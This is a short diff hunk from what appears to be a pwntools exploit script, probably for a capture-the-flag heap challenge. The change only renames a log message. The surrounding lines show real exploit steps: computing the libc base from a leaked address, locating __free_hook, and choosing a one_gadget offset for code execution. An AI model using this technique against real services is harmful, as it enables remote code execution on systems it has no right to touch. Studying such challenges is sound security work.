@@ -67,7 +67,7 @@ p.recv(0x130)
 leak = u64(p.recv(6)+"\x00"*2)
 log.info("leak: " + hex(leak))
 libc_base = leak - 0x1ebbe0
-log.info("leak: " + hex(libc_base))
+log.info("Base: " + hex(libc_base))
 free_hook = libc_base + libc.symbols['__free_hook']
 #0xe6c7e 0xe6c81 0xe6c84
 one_gadget = libc_base + 0xe6c81
